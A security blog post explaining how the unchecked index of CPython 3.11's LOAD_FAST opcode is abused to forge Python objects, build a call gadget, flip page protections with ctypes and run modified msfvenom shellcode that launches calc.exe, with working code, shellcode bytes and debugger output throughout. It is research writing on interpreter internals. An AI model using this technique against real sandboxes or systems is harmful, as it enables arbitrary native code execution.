---
layout: post
author: JuliaPoo
category: Security

display-title: "Abusing LOAD_FAST in Python 3 VM"
tags:
    - pwn
    - binary-exploitation
    - security
    - python3
    - vm

nav: |
    * [Metadata](#metadata)
    * [A Very Brief Introduction](#a-very-brief-introduction)
    * [Planning the Attack](#planning-the-attack)
    * [Abusing `LOAD_FAST`](#abusing-load_fast)
        * [Indexing into Known Memory](#indexing-into-known-memory)
        * [Creating an arbituary call gadget](#creating-an-arbituary-call-gadget)
        * [Not Yet](#not-yet)
        * [Crafting our Shellcode](#crafting-our-shellcode)
    * [Final Thoughts](#final-thoughts)


excerpt: "Pwning Python 3 VM via an intended feature (Disclaimer: Not a vulnerability)"
---

## Metadata

A while ago, I read this [article](https://doar-e.github.io/blog/2014/04/17/deep-dive-into-pythons-vm-story-of-load_const-bug/) about abusing `LOAD_CONST` in Python 2.7. We are in Python 3.11 now, and CPython has since implemented quite a lot more features and checks. I wanna try to abuse the Python 3 VM to similarly execute shellcode, but I wanna do so without crashing CPython.

Some things to note first:
1. Just like the case for `LOAD_CONST` in Python 2, the bug I abused in `LOAD_FAST` in Python 3 is known. It's even in the name! It's just [way faster to leave that bug there](https://bugs.python.org/issue17190).
2. I mean there's the `ctypes` module that allows you to do literally anything. But that's not fun at all.
3. I did not know _anything_ about the Python interpreter prior to starting this. I've written some high level explanation of how CPython does things below, hopefully it's correct and helpful for anybody just starting.
    * Also CPython source is just so easy to read. It's been a joy.

Since I wanna try this on the newest Python, I cloned [CPython](https://github.com/python/cpython) and built the x64 Debug and Release version of CPython. At the time of writing that version would be `Python 3.11.0a0`. I'll also be doing all this in Windows.

## A Very Brief Introduction

So this post won't really make sense if not for some background about CPython. The way python interprets is by compiling a python script into Python bytecode. These bytecode are instructions which are executed by the Python VM.

A unique thing about Python bytecode is that unlike CPU bytecode, which is really low level, Python bytecode is really high level (surprise!). Everything that a Python bytecode instruction acts on is a `PyObject`, which is everything in Python, including your `str`, `int`, `list`, `dict`, etc.

This makes Python bytecode really easy to read. E.g. A `BINARY_ADD` instruction on two strings `a` and `b` will simply be `a+b`, or the concatenation of `a` and `b`, exactly what you would expect in Python.

The bytecode is represented as a `PyCodeObject`, and contains fields specific to the bytecode, such as `co_const`, which contains the constants used in the bytecode. The `CPython` source code provides some very useful documentation for the fields:

```cpp
// include/cpython/code.h:17

/* Bytecode object */
struct PyCodeObject {
    PyObject_HEAD
    int co_argcount;            /* #arguments, except *args */
    int co_posonlyargcount;     /* #positional only arguments */
    int co_kwonlyargcount;      /* #keyword only arguments */
    int co_nlocals;             /* #local variables */
    int co_stacksize;           /* #entries needed for evaluation stack */
    int co_flags;               /* CO_..., see below */
    int co_firstlineno;         /* first source line number */
    PyObject *co_code;          /* instruction opcodes */
    PyObject *co_consts;        /* list (constants used) */
    PyObject *co_names;         /* list of strings (names used) */
    PyObject *co_varnames;      /* tuple of strings (local variable names) */
    PyObject *co_freevars;      /* tuple of strings (free variable names) */
    PyObject *co_cellvars;      /* tuple of strings (cell variable names) */
    /* The rest aren't used in either hash or comparisons, except for co_name,
       used in both. This is done to preserve the name and line number
       for tracebacks and debuggers; otherwise, constant de-duplication
       would collapse identical functions/lambdas defined on different lines.
    */
    Py_ssize_t *co_cell2arg;    /* Maps cell vars which are arguments. */
    PyObject *co_filename;      /* unicode (where it was loaded from) */
    PyObject *co_name;          /* unicode (name, for reference) */
    PyObject *co_linetable;     /* string (encoding addr<->lineno mapping) See
                                   Objects/lnotab_notes.txt for details. */
    PyObject *co_exceptiontable; /* Byte string encoding exception handling table */
    void *co_zombieframe;       /* for optimization only (see frameobject.c) */
    PyObject *co_weakreflist;   /* to support weakrefs to code objects */
    /* Scratch space for extra data relating to the code object.
       Type is a void* to keep the format private in codeobject.c to force
       people to go through the proper APIs. */
    void *co_extra;

    /* Per opcodes just-in-time cache
     *
     * To reduce cache size, we use indirect mapping from opcode index to
     * cache object:
     *   cache = co_opcache[co_opcache_map[next_instr - first_instr] - 1]
     */

    // co_opcache_map is indexed by (next_instr - first_instr).
    //  * 0 means there is no cache for this opcode.
    //  * n > 0 means there is cache in co_opcache[n-1].
    unsigned char *co_opcache_map;
    _PyOpcache *co_opcache;
    int co_opcache_flag;  // used to determine when create a cache.
    unsigned char co_opcache_size;  // length of co_opcache.
};
```

However, Python bytecode requires a sort of _context_ in which to execute. The bytecode executes with its own stack, constants, namespace and other variables that **changes depending on where you are executing**. Take for instance:

```python
def f(a):
    print(a)
print(a)
```

The variable `a` in the function `f` is defined while the one outside isn't. So how does Python deal with different execution context?

The answer is in _frames_. CPython creates frames to execute a chunk of bytecode in its context. Hence each frame would contain stuff like the stack, constants, namespace, etc that the bytecode uses. 

```cpp
// include/cpython/frameobject.h:22

struct _frame {
    PyObject_VAR_HEAD
    struct _frame *f_back;      /* previous frame, or NULL */
    PyCodeObject *f_code;       /* code segment */
    PyObject *f_builtins;       /* builtin symbol table (PyDictObject) */
    PyObject *f_globals;        /* global symbol table (PyDictObject) */
    PyObject *f_locals;         /* local symbol table (any mapping) */
    PyObject **f_valuestack;    /* points after the last local */
    PyObject *f_trace;          /* Trace function */
    /* Borrowed reference to a generator, or NULL */
    PyObject *f_gen;
    int f_stackdepth;           /* Depth of value stack */
    int f_lasti;                /* Last instruction if called */
    int f_lineno;               /* Current line number. Only valid if non-zero */
    PyFrameState f_state;       /* What state the frame is in */
    char f_trace_lines;         /* Emit per-line trace events? */
    char f_trace_opcodes;       /* Emit per-opcode trace events? */
    PyObject *f_localsplus[1];  /* locals+stack, dynamically sized */
};
```

This is important as the instruction I'm about to abuse, `LOAD_FAST`, requires getting the address of `_frame.f_localsplus` as you'll see later.

So far I've given a very high level overview of how Python interprets. If you would like to know more I highly recommend reading [this amazing resource](https://leanpub.com/insidethepythonvirtualmachine/read), and the article I linked to above, which steps through the bytecode in WinDbg.

## Planning the Attack

So of course I didn't settle for abusing `LOAD_FAST` immediately. I first looked at `LOAD_CONST` and some other opcodes. 

`LOAD_CONST <idx>` loads a `PyObject` from the constants (`PyCodeObject.co_const`) onto the python VM stack. Meanwhile `LOAD_FAST <idx>`, loads a `PyObject` from the locals (`_frame.f_localsplus`).

`LOAD_CONST` was [totally abusable in Python 2](https://doar-e.github.io/blog/2014/04/17/deep-dive-into-pythons-vm-story-of-load_const-bug/). However Python 3 decided to fix it.

Python 2:
```cpp
#define PyTuple_GET_ITEM(op, i) (((PyTupleObject *)(op))->ob_item[i])
#define GETITEM(v, i) PyTuple_GET_ITEM((PyTupleObject *)(v), (i))

/* ... */

case LOAD_CONST:
  x = GETITEM(consts, oparg);
  Py_INCREF(x);
  PUSH(x);
  goto fast_next_opcode;
```

Python 3:
```cpp
PyObject *
PyTuple_GetItem(PyObject *op, Py_ssize_t i)
{
    if (!PyTuple_Check(op)) {
        PyErr_BadInternalCall();
        return NULL;
    }
    if (i < 0 || i >= Py_SIZE(op)) {
        PyErr_SetString(PyExc_IndexError, "tuple index out of range");
        return NULL;
    }
    return ((PyTupleObject *)op) -> ob_item[i];
}

/* ... */

#define GETITEM(v, i) PyTuple_GetItem((v), (i))

/* ... */

case TARGET(LOAD_CONST): {
    PREDICTED(LOAD_CONST);
    PyObject *value = GETITEM(consts, oparg);
    Py_INCREF(value);
    PUSH(value);
    DISPATCH();
}
```

As you can see, they changed direct array indexing in Python 2 to creating a proper `PyTuple` for the constants and indexing it. 

This means that `LOAD_CONST` in Python 3 would actually check for out-of-bounds and handle it gracefully, returning the familiar `IndexError: tuple index out of range` exception. 

Since we control the value of `oparg`, it would have been possible to index way out of bounds and read practically anything in memory in Python 2, which won't be possible in Python 3.

Having realised that, I then goofed around with some other opcodes and eventually went back to `LOAD_FAST`, and true to it's name, it loads really quickly because it indexes an array directly:

Python 3:
```cpp
#define GETLOCAL(i)     (fastlocals[i])

/* ... */

case TARGET(LOAD_FAST): {
    PyObject *value = GETLOCAL(oparg);
    if (value == NULL) {
        format_exc_check_arg(tstate, PyExc_UnboundLocalError,
                                UNBOUNDLOCAL_ERROR_MSG,
                                PyTuple_GetItem(co->co_varnames, oparg));
        goto error;
    }
    Py_INCREF(value);
    PUSH(value);
    DISPATCH();
}
```

`fastlocals` is actually the aforementioned `_frame.f_localsplus`. It is specific to the frame and stores the local variables of said frame (surprise 2.0!). Since we again control the variable `oparg`, we can easily index way beyond `fastlocals` to anywhere we want in memory. Let's verify this quickly with a crash from indexing _somewhere_ invalid in memory:

```python
# Python 3.11.0a0

import opcode
import types

def inst(opc:str, arg:int=0):

    "Makes life easier in writing python bytecode"

    nb = max(1,-(-arg.bit_length()//8))
    ab = arg.to_bytes(nb, 'big')
    ext_arg = opcode.opmap['EXTENDED_ARG']
    inst = bytearray()
    for i in range(nb-1):
        inst.append(ext_arg)
        inst.append(ab[i])
    inst.append(opcode.opmap[opc])
    inst.append(ab[-1])
    
    return bytes(inst)

crash_bytecode = b"".join([
    inst('LOAD_FAST', 0xdeadbeef), # Index _somewhere_ in memory
    inst('RETURN_VALUE')
])

def g(): pass
def assign_bytecode(bytecode): 
    global g
    g.__code__ = types.CodeType(
        0, # argcount
        0, # posonlyargcount
        0, # kwonlyargcount
        20, # nlocals (big enough)
        20, # stacksize (big enough)
        0, # flags
        bytecode, # codestring
        (), # constants
        (), # names
        (), # varnames
        "", # filename
        "", # name
        0, # firstlineno
        b"", # linetable
        b"", # exceptiontable
    )

assign_bytecode(crash_bytecode)
g() # Crash!
```

Windbg logging the crash:
```
(5118.3268): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.

python311!_PyEval_EvalFrameDefault+0x42c:
00007ff8`1b4f756c 498b44d668      mov     rax,qword ptr [r14+rdx*8+68h] ds:000001c5`343c00e0=????????????????
0:000> ?rdx
Evaluate expression: -559038737 = ffffffff`deadbeef
```

## Abusing `LOAD_FAST`

### Indexing into Known Memory

We first need to get the address of the frame at which the instruction `LOAD_FAST <index>` is going to be ran. We can do this by calling `sys._getframe()` which returns the current frame object, and then calling `id` on it. CPython actually returns the pointer to the `PyObject` when you call `id` on it so that's very convenient.

```
>>> help(id)
Help on built-in function id in module builtins:

id(obj, /)
    Return the identity of an object.

    This is guaranteed to be unique among simultaneously existing objects.
    (CPython uses the object's memory address.)
```

We need the address of the current executing frame so we actually know where we are indexing into, and we need the address of the same frame because the address of `fastlocals` changes according to which frame we are in.

My first thought was to get the address of the frame, calculate the index we want in order to read a predefined memory location, modify a global `PyBytesObject` object that contains the instruction `LOAD_FAST <index>` and use the opcode `JUMP_FORWARD` to jump way past the frame's code object into that global `PyBytesObject` and continue executing from there. And viola! Everything happens in the same frame and the address of `fastlocals` stays the same.

Then I realised you can actually replace the bytecode of the frame, without deallocating the frame, meaning its address stays the same!

```python
def g(): pass
def assign_bytecode(bytecode): 
    global g
    g.__code__ =  types.CodeType(
        0, # argcount
        0, # posonlyargcount
        0, # kwonlyargcount
        20, # nlocals (big enough)
        20, # stacksize (big enough)
        0, # flags
        bytecode, # codestring
        (id, sys._getframe), # constants
        (), # names
        ('a',), # varnames
        "", # filename
        "", # name
        0, # firstlineno
        b"", # linetable
        b"", # exceptiontable
    )

# Runs `return id(sys._getframe())`
bytecode = b"".join([
    # Get address of its frame and return
    inst('LOAD_CONST', 0), # Load id
    inst('LOAD_CONST', 1), # Load sys._getframe
    inst('CALL_FUNCTION', 0),
    inst('CALL_FUNCTION', 1),
    inst('RETURN_VALUE')
])

assign_bytecode(bytecode)
print("Frame1 Address:", hex(frame_addr1 := g()))

assign_bytecode(inst('NOP')+bytecode) # Replace the bytecode of g
print("Frame2 Address:", hex(frame_addr2 := g()))

assert frame_addr1 == frame_addr2

# Output:
# > Frame1 Address: 0x151a34945f0
# > Frame2 Address: 0x151a34945f0
```

This means we can simply get the frame address, calculate the index we need outside of the frame, then replace the bytecode of the frame with the actual exploit `LOAD_FAST <index>`. Which is so much easier!

To test this we'll try to access any `PyObject` we want in memory. However, do note that `_frame.f_localsplus` has type `PyObject **`, which means that we want the memory we index into to be be a pointer to a `PyObject`. We can do this by creating a `PyBytesObject` to store the address of the `PyObject` we wanna access, and make `LOAD_FAST` access the data field (`PyBytesObject.ob_sval`) of `PyBytesObject`:

```python
# Arbituary Object
arb_object = "Hello! ^-^"

# PyBytesObject that contains the address of `object`
PyBytesObject_arb_object_addr = id(arb_object).to_bytes(8, 'little')

# Offset of PyBytesObject.ob_sval
PyBytesObject_ob_sval_offset = 0x20
# Address to data of `object_addr_PyBytesObject`, 
# which is equivalent to `&(&object)`
arb_object_ptr_ptr = id(PyBytesObject_arb_object_addr) + PyBytesObject_ob_sval_offset
```

We can then calculate the `idx` for `LOAD_CONST <idx>` to access `object_ptr_ptr`:

```python
# Runs `return id(sys._getframe())`
bytecode1 = b"".join([
    # Get address of its frame and return
    inst('LOAD_CONST', 0), # Load id
    inst('LOAD_CONST', 1), # Load sys._getframe
    inst('CALL_FUNCTION', 0),
    inst('CALL_FUNCTION', 1),
    inst('RETURN_VALUE')
])

# Returns *(fastlocals[idx])
bytecode2 = lambda idx: b"".join([
    inst('LOAD_FAST', idx),
    inst('RETURN_VALUE')
])

# Get frame address by loading bytecode1
assign_bytecode(bytecode1)
print("Frame1 Address:", hex(frame_addr := g()))

# Offset of _frame.f_localsplus
_frame_f_localsplus_offset = 0x68
# Calculate idx
# r14+rdx*8+68h --> arb_object_ptr_ptr = 
#   frame_addr + idx*8 + _frame_f_localsplus_offset
idx = (arb_object_ptr_ptr - _frame_f_localsplus_offset - frame_addr)//8
print("idx:", hex(idx))
assert 0 <= idx < (1<<32), "idx out of range!"

# Replace the bytecode of g to return *(fastlocals[idx])
assign_bytecode(bytecode2(idx))

# Attempt to return `arb_object`
print("arb_object:", g())

# Output
# > Frame1 Address: 0x1eb158945f0
# > idx: 0x640db
# > arb_object: Hello! ^-^
```

Success! We managed to access `arb_object` from `g()` via abusing `LOAD_FAST`!

A caveat though, is that we can't access all memory (at least in 64 bit). `oparg` is stored as a 4 bytes `int`, which means that `idx` cannot be more than 4 bytes. And it can't be negative either, so we can't index backwards.

This is a different story in `32-bit` Python though. Since the address space is 32 bits as well, we can overflow and effectively index backwards. If you're curious you should totally try that out.

Being able to index practically anywhere in memory and having CPython interprete it as a `PyObject`, means that we could create a fake `PyObject` in memory, controlling all the fields we want by adding the data anywhere we want and have `LOAD_FAST` access it. What we are gonna do with this is to make CPython call any address we want, aka a call gadget.

### Creating an arbituary call gadget

Scrolling through the opcodes, `DELETE_DEREF` makes for a really clean call gadget as there are minimal checks.

```cpp
void
_Py_Dealloc(PyObject *op)
{
    destructor dealloc = Py_TYPE(op)->tp_dealloc;
#ifdef Py_TRACE_REFS
    _Py_ForgetReference(op);
#endif
    (*dealloc)(op); // <-- Hell yea
}

/* ... */

case TARGET(DELETE_DEREF): {
    PyObject *cell = freevars[oparg];
    PyObject *oldobj = PyCell_GET(cell);
    if (oldobj != NULL) {
        PyCell_SET(cell, NULL);
        Py_DECREF(oldobj); // <-- Calls _Py_Dealloc
        DISPATCH();
    }
    format_exc_unbound(tstate, co, oparg);
    goto error;
}
```

All we have to do is create a fake `PyObject` whose `PyTypeObject.tp_dealloc` contains the address we want. It's really clean!

Though in the spirit of the original post, (and because I wanna return a `PyFunctionObject` I can move around in regular python code and call anytime for aesthetic reasons), I'll be using `CALL_FUNCTION`, which is quite a bit more involved.

So let's look at the source code to see which fields of the `PyFunctionObject` need to be spoofed:

```cpp
#define Py_TYPE(ob)             (_PyObject_CAST(ob)->ob_type)

/* ... */

int
PyCallable_Check(PyObject *x)
{
    if (x == NULL)
        return 0;
    return Py_TYPE(x)->tp_call != NULL;
}

/* ... */

static inline vectorcallfunc
PyVectorcall_Function(PyObject *callable)
{
    PyTypeObject *tp;
    Py_ssize_t offset;
    vectorcallfunc ptr;

    assert(callable != NULL);
    // vvv Our PyFunctionObject needs to have a PyTypeObject
    tp = Py_TYPE(callable);
    if (!PyType_HasFeature(tp, Py_TPFLAGS_HAVE_VECTORCALL)) {
        return NULL;
    }
    // vvv Its PyTypeObject needs to have tp_call not null
    assert(PyCallable_Check(callable));
    // vvv callable+offset contains address of of function to run
    offset = tp->tp_vectorcall_offset;
    assert(offset > 0);
    memcpy(&ptr, (char *) callable + offset, sizeof(ptr));
    return ptr; // <-- ptr is the address CPython will call at.
}

/* ... */

static inline PyObject *
_PyObject_VectorcallTstate(PyThreadState *tstate, PyObject *callable,
                           PyObject *const *args, size_t nargsf,
                           PyObject *kwnames)
{
    vectorcallfunc func;
    PyObject *res;

    assert(kwnames == NULL || PyTuple_Check(kwnames));
    assert(args != NULL || PyVectorcall_NARGS(nargsf) == 0);

    func = PyVectorcall_Function(callable);
    if (func == NULL) { // <-- Don't care
        /* ... */
    }
    res = func(callable, args, nargsf, kwnames); // <-- Our call gadget!!
    // ^ note that `res` is a PyObject*
    return _Py_CheckFunctionResult(tstate, callable, res, NULL);
}

/* ... */

static inline PyObject *
PyObject_Vectorcall(PyObject *callable, PyObject *const *args,
                     size_t nargsf, PyObject *kwnames)
{
    PyThreadState *tstate = PyThreadState_Get();
    return _PyObject_VectorcallTstate(tstate, callable,
                                      args, nargsf, kwnames);
}

/* ... */

Py_LOCAL_INLINE(PyObject *) _Py_HOT_FUNCTION
call_function(PyThreadState *tstate,
              PyTraceInfo *trace_info,
              PyObject ***pp_stack,
              Py_ssize_t oparg,
              PyObject *kwnames)
{
    PyObject **pfunc = (*pp_stack) - oparg - 1;
    PyObject *func = *pfunc;
    PyObject *x, *w;
    Py_ssize_t nkwargs = (kwnames == NULL) ? 0 : PyTuple_GET_SIZE(kwnames);
    Py_ssize_t nargs = oparg - nkwargs;
    PyObject **stack = (*pp_stack) - nargs - nkwargs;

    if (trace_info->cframe.use_tracing) { // <-- Don't care
        /* ... */
    }
    else {  // <-- Yes this is important
        x = PyObject_Vectorcall(func, stack, nargs | PY_VECTORCALL_ARGUMENTS_OFFSET, kwnames);
    }

    assert((x != NULL) ^ (_PyErr_Occurred(tstate) != NULL));

    /* Clear the stack of the function object. */
    while ((*pp_stack) > pfunc) {
        w = EXT_POP(*pp_stack);
        Py_DECREF(w);
    }

    return x;
}

/* ... */

case TARGET(CALL_FUNCTION): {
    PREDICTED(CALL_FUNCTION);
    PyObject **sp, *res;
    sp = stack_pointer;
    res = call_function(tstate, &trace_info, &sp, oparg, NULL);
    stack_pointer = sp;
    PUSH(res);
    if (res == NULL) {
        goto error;
    }
    CHECK_EVAL_BREAKER();
    DISPATCH();
}
```

I've put (and commented) the relevant source so you can figure out for urself but here's the summary:

Let `PyObject *callable` be the pointer to our `PyFunctionObject` and `tp` be the `PyObjectType*`, `callable->ob_type`.

1. `tp->tp_flags` to have `Py_TPFLAGS_HAVE_VECTORCALL` bit set.
2. `tp->tp_call` to have to be non-zero
3. `tp->tp_vectorcall_offset + callable` is to contain the address of the shellcode.

So creating the `tp`:

```python
# PyBytesObject.ob_sval offset, the offset to our actual bytes
PyBytesObject_ob_sval_offset = 0x20

fake_typeobject = bytearray(b'A'*0x190)
fake_typeobject[0x038:0x038+8] = (0x10).to_bytes(8, 'little') # tp_vectorcall_offset
fake_typeobject[0x080:0x080+8] = (0x1).to_bytes(8, 'little') # tp_call
fake_typeobject[0x0a8:0x0a8+8] = (0x800).to_bytes(8, 'little') # tp_flags
fake_typeobject = bytes(fake_typeobject)
fake_typeobject_addr = id(fake_typeobject) + PyBytesObject_ob_sval_offset
```

Creating `callable`:

```python
shellcode = b"\xCC Hello Success!!!" # <-- breakpoint (int 3)
shellcode_addr = id(shellcode) + PyBytesObject_ob_sval_offset

fake_callable = bytearray(b'a'*0x18)
fake_callable[0x008:0x008+8] = fake_typeobject_addr.to_bytes(8, 'little') # ob_type
fake_callable[0x010:0x010+8] = shellcode_addr.to_bytes(8, 'little') # shellcode
fake_callable = bytes(fake_callable)
fake_callable_addr = id(fake_callable) + PyBytesObject_ob_sval_offset
```

Abusing `LOAD_FAST` to load `fake_callable`:

```python
control_data = fake_callable_addr.to_bytes(8,'little')
control_data_addr = id(control_data) + PyBytesObject_ob_sval_offset

# Runs `return id(sys._getframe())`
bytecode1 = b"".join([
    # Get address of its frame and return
    inst('LOAD_CONST', 0), # Load id
    inst('LOAD_CONST', 1), # Load sys._getframe
    inst('CALL_FUNCTION', 0),
    inst('CALL_FUNCTION', 1),
    inst('RETURN_VALUE')
])

# Returns *(fastlocals[idx])
bytecode2 = lambda idx: b"".join([
    inst('LOAD_FAST', idx),
    inst('RETURN_VALUE')
])

# Get frame address by loading bytecode1
assign_bytecode(bytecode1)
frame_addr = g()
print("frame addr:", hex(frame_addr))

# Offset of _frame.f_localsplus
_frame_f_localsplus_offset = 0x68
# offset + frame_addr + idx*ptr_size = addr
# idx = (addr - offset - frame_addr)//ptr_size
idx = (control_data_addr - _frame_f_localsplus_offset - frame_addr)//8
print("index:", hex(idx))
assign_bytecode(bytecode2(idx))

# Returns our call gadget
run = g()

# Run our call gadget
run()
```

Running it in WinDbg we get:

```
(5b78.4910): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
00000211`f8108290 cc              int     3
0:000> da
00000211`f8108290  ". Hello Success!!!"
```

And success!! We made CPython jump to `shellcode`!

### Not Yet

You might notice that the error for the crash above is `c0000005` and not `80000003`. This means that we are getting an `Access violation` rather than a `Break instruction exception` as expected when executing an `int 3` instruction. This is because of page permissions:

```
0:000> !address rip

Usage:                  <unknown>
Base Address:           00000211`f8070000
End Address:            00000211`f8170000
Region Size:            00000000`00100000 (   1.000 MB)
State:                  00001000          MEM_COMMIT
Protect:                00000004          PAGE_READWRITE // <-- No execute :(
Type:                   00020000          MEM_PRIVATE
Allocation Base:        00000211`f8070000
Allocation Protect:     00000004          PAGE_READWRITE


Content source: 1 (target), length: 67d70
```

The page does not have execute permission. We can maybe find some fancy gadget to ROP our way out of this or smth but at this point I'm lazy so I just used `ctypes` to change the page permissions. It's boring.

```python
VirtualProtect = ctypes.windll.kernel32.VirtualProtect
old = ctypes.c_long(1)
res = VirtualProtect(
    ctypes.c_void_p(shellcode_addr), 
    len(shellcode), 0x40, ctypes.byref(old))
```

But it works!
```
(76e4.2b68): Break instruction exception - code 80000003 (first chance)
0000011c`74f882d0 cc              int     3
0:000> da
0000011c`74f882d0  ". Hello Success!!!"
```

### Crafting our Shellcode

We're gonna try running shellcode that calls `WinExec` to execute commands. I used `msfvenom`:

```python
> msfvenom -p windows/x64/exec CMD="calc.exe" EXITFUNC=none -f python

shellcode =  b""
shellcode += b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41"
shellcode += b"\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48"
shellcode += b"\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f"
shellcode += b"\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c"
shellcode += b"\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52"
shellcode += b"\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b"
shellcode += b"\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0"
shellcode += b"\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56"
shellcode += b"\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9"
shellcode += b"\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0"
shellcode += b"\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58"
shellcode += b"\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
shellcode += b"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0"
shellcode += b"\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
shellcode += b"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
shellcode += b"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00"
shellcode += b"\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41"
shellcode += b"\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xaa\xc5\xe2\x5d\x41"
shellcode += b"\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06"
shellcode += b"\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
shellcode += b"\x00\x59\x41\x89\xda\xff\xd5"
shellcode += b"calc.exe\x00" # <-- The command!
```

Attempting to run that successfully opens `calc.exe` but results in a crash in CPython:

```
(14b0.2714): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
000001e1`1696d51b 63616c          movsxd  esp,dword ptr [rcx+6Ch] ds:00000000`0000006c=????????
0:000> da
000001e1`1696d51b  "calc.exe"
```

It attempted to run `calc.exe`! Also remember how this shellcode should return a `PyObject*` so that CPython doesn't crash? Furthermore, msfvenom shellcode destroys the stack and some important registers (The audacity!). Hence, to ensure it doesn't crash we'd need to:

1. Move the stack pointer forward
2. Push a bunch of important registers
3. Run the shellcode
4. Restore the stack
5. Pop the important registers back
6. Move the stack pointer backwards to its original place
7. Move the pointer of a random `PyObject` into `rax`
8. Return

The `calc.exe` also has to be moved forward to allow space for steps 4-8, so pointers in the shellcode also has to be patched. Here's what it looks like:

```python
retobj = "Success!! ^-^"
shellcode = b"".join([

    b"\x48\x81\xec\x00\x10\x00\x00", # sub rsp,0x1000
    b"\x50\x53\x51\x52\x55", # push rax, rbx, rcx, rdx, rbp
    
    # msfvenom -p windows/x64/exec CMD="calc.exe" EXITFUNC=none -f python
    # Modified to not crash the interpreter, 
    # at least until it finishes running this file.
    b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41",
    b"\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48",
    b"\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f",
    b"\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c",
    b"\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52",
    b"\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b",
    b"\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0",
    b"\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56",
    b"\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9",
    b"\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0",
    b"\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58",
    b"\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44",
    b"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0",
    b"\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a",
    b"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48",
    b"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00",
    b"\x00\x00\x00\x00\x00\x48\x8d\x8d\x1f\x01\x00\x00\x41",
    b"\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xaa\xc5\xe2\x5d\x41",
    b"\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06",
    b"\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a",
    b"\x00\x59\x41\x89\xda\xff\xd5",

    b"\x48\x81\xc4\x38\x00\x00\x00", # add rsp,0x38
    b"\x5D\x5A\x59\x5B\x58", # pop rax, rbx, rcx, rdx, rbp
    b"\x48\x81\xc4\x00\x10\x00\x00", # add rsp,0x1000
    b"\x48\xb8" + id(retobj).to_bytes(8, 'little'), # mov rax, <retobj addr>
    b"\xc3", # ret

    b"calc.exe\x00",

])

# ...

# Returns our call gadget
run = g()

# Run our call gadget
print(run())

# Output:
# > Success!! ^-^
```

And it's done! If you want to see the full script to run the exploit, see [here](https://gist.github.com/JuliaPoo/2a24ea3743770cf3e25ff45c23a512b5)!

CPython actually crashes when the program ends in the garbage collector. And that's because our `PyFuncObject` and its `PyTypeObject` is so hopelessly malformed.

## Final Thoughts

I _would_ have had stuff to write here if I didn't procrastinate writing this article for a whole week.